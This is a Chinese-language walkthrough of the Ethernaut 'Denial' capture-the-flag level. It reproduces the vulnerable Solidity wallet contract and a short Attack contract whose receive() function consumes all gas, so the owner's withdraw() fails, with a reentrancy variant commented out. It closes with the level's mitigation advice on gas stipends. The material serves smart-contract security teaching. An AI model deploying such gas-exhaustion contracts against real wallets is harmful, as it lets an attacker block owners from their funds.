# Denial

> This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.
>
> If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

## 攻击思路

1. transfer
  如果异常会转账失败，抛出异常(等价于require(send()))（合约地址转账）
  有gas限制，最大2300
  函数原型：

  ```solidity
  <address payable>.transfer(uint256 amount)
  ```

2. call
  如果异常会转账失败，仅会返回false，不会终止执行（调用合约的方法并转账）
  没有gas限制

  函数原型：

  ```solidity
  <address>.call(bytes memory) returns (bool, bytes memory)
  ```

call方法会将调用结果以true和false的形式返回，即使调用过程中有错误发生，也不会影响后续的代码。

所以只有让gas全部在call方法时全部消耗掉，无法运行后续代码。

或者进行重入攻击，转走合约中的所有本币。但是题目要求`whilst the contract still has funds`.就不能转走合约里全部的钱。

## 攻击流程

```solidity
contract Attack {

    Denial target;

    function beforeAll(address payable denial) public{
        target = Denial(denial);
        target.setWithdrawPartner(address(this));
    }

    receive() external payable {

        // 重入攻击
        //target.withdraw();

        // 消耗掉所有gas值
        assert(false);

        // 消耗掉所有gas值
        //while(true){}
    }
}
```

此处记录一种[特殊现象](https://rinkeby.etherscan.io/tx/0xdc5546f332b1e019bb29103f0b22402e3238ea4916a479144068bf7adc89a61c)。在[此处](https://ethereum.stackexchange.com/questions/107882/ethernaut-level-20-denial-probably-no-longer-solvable-why)得到解答是，assert在某些版本的solc中会被优化为revert，防止gas全部被消耗。

This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.

If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `call.gas(100000).value()`.

Typically one should follow the [checks-effects-interactions](http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

*Note*: An external `CALL` can use at most 63/64 of the gas currently available at the time of the `CALL`. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.